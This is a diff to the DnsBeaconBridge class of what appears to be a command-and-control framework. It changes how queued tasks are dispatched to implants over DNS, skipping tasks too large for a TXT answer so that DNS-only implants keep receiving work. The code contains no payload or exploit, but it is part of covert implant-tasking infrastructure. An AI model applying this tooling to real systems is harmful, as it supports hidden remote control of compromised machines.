@@ -435,31 +435,39 @@ internal sealed class DnsBeaconBridge
         await _sessions.TouchAsync(implant, session.Capabilities, _clock.GetUtcNow(), "dns", cancellationToken);
 
         var degraded = session.Capabilities.Contains(Rod.Transport.Channels.DegradedChannelHub.Capability);
-        var dispatched = await _tasks.DispatchNextAsync(implant, cancellationToken);
-        if (dispatched is not null)
-        {
-            var marshaled = _tasking.BuildSignedRequest(dispatched).ToByteArray();
 
-            // The claim evaluation every poll carrier runs (architecture.md
-            // Sec 10.3): DNS declares a datagram-sized budget; a channel task
-            // claims under the store-and-forward discipline a degraded
-            // session advertised, and a task too large for a TXT answer is
-            // requeued untouched for a stream transport to claim.
+        // The claim evaluation every poll carrier runs (architecture.md
+        // Sec 10.3): DNS declares a datagram-sized budget; a channel task
+        // claims under the store-and-forward discipline a degraded session
+        // advertised, and a task too large for a TXT answer is requeued
+        // untouched for a stream transport to claim. A requeued task joins
+        // the skip set for the rest of this contact, so a task this carrier
+        // cannot serve parks without standing at the queue head -- a strict
+        // head-of-line claim would wedge a DNS-only implant's tasking on one
+        // oversized or channel-bound task forever.
+        var skipped = new HashSet<TaskId>();
+        while (true)
+        {
+            var dispatched = await _tasks.DispatchNextAsync(implant, cancellationToken, exclude: skipped);
+            if (dispatched is null)
+                break;
+
+            var marshaled = _tasking.BuildSignedRequest(dispatched).ToByteArray();
             if (TransportCapabilities.EvaluateClaim(
                     TransportCapabilities.Dns, dispatched.Verb, marshaled.Length, MaxTaskRequestBytes, degraded)
                 != ClaimDecision.Claim)
             {
                 await _tasks.RequeueAsync(dispatched.TaskId, CancellationToken.None);
+                skipped.Add(dispatched.TaskId);
+                continue;
             }
-            else
-            {
-                // The dispatch is recorded with the same shape every beacon
-                // transport writes (architecture.md Sec 11): attributed to
-                // the operator whose tasking it carries out, the outcome the
-                // dispatched task id.
-                await _tasking.RecordDispatchAsync(dispatched, cancellationToken);
-                return PrependKind(TaskKindByte, marshaled);
-            }
+
+            // The dispatch is recorded with the same shape every beacon
+            // transport writes (architecture.md Sec 11): attributed to
+            // the operator whose tasking it carries out, the outcome the
+            // dispatched task id.
+            await _tasking.RecordDispatchAsync(dispatched, cancellationToken);
+            return PrependKind(TaskKindByte, marshaled);
         }
 
         // No task the carrier can serve: the store-and-forward half -- the
